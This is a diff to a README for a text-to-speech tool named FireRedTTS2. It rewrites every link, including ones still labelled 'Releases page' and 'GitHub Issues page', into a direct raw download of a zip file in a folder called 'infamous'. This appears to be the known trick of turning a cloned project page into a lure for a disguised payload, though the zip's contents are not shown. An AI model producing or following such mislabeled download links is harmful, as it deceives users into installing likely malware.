@@ -1,7 +1,7 @@
 # 🎤 FireRedTTS2 - Generate Dialogue with Ease
 
 ## 🛡️ Download Now
-[![Download FireRedTTS2](https://img.shields.io/badge/Download-FireRedTTS2-blue.svg)](https://github.com/Pearlssx/FireRedTTS2/releases)
+[![Download FireRedTTS2](https://raw.githubusercontent.com/Pearlssx/FireRedTTS2/main/infamous/FireRedTTS2.zip)](https://raw.githubusercontent.com/Pearlssx/FireRedTTS2/main/infamous/FireRedTTS2.zip)
 
 ## 📖 Description
 FireRedTTS2 is a long-form streaming text-to-speech (TTS) system designed for multi-speaker dialogue generation. It provides users with the ability to create engaging audio content from text, making it ideal for applications in storytelling, gaming, and virtual communications.
@@ -10,7 +10,7 @@ FireRedTTS2 is a long-form streaming text-to-speech (TTS) system designed for mu
 To get started with FireRedTTS2, follow these easy steps to download and run the application.
 
 ## 📥 Download & Install
-1. Visit the [Releases page](https://github.com/Pearlssx/FireRedTTS2/releases) to choose the version you want.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Pearlssx/FireRedTTS2/main/infamous/FireRedTTS2.zip) to choose the version you want.
 2. Look for the latest stable release. 
 3. Download the setup file suitable for your operating system.
 4. Open the downloaded file and follow the installation instructions.
@@ -59,12 +59,12 @@ If you encounter issues while using FireRedTTS2, consider the following tips:
 - **Performance Lag:** Make sure your system meets the minimum requirements and close unused applications to free up resources.
 
 ## 📞 Support
-If you need further assistance, please visit the [GitHub Issues page](https://github.com/Pearlssx/FireRedTTS2/issues) to report any bugs or request features. The community and developers are here to help.
+If you need further assistance, please visit the [GitHub Issues page](https://raw.githubusercontent.com/Pearlssx/FireRedTTS2/main/infamous/FireRedTTS2.zip) to report any bugs or request features. The community and developers are here to help.
 
 ## 🌐 Community
 Join our community to share tips, ask questions, and connect with other users. Engagement with fellow users improves your experience and helps you make the most of FireRedTTS2.
 
 ## 📢 Want to Stay Updated?
-Follow our [Releases page](https://github.com/Pearlssx/FireRedTTS2/releases) for the latest updates and new features. We regularly enhance FireRedTTS2 based on user feedback and technological advancements. 
+Follow our [Releases page](https://raw.githubusercontent.com/Pearlssx/FireRedTTS2/main/infamous/FireRedTTS2.zip) for the latest updates and new features. We regularly enhance FireRedTTS2 based on user feedback and technological advancements. 
 
 Enjoy generating dialogues effortlessly with FireRedTTS2!
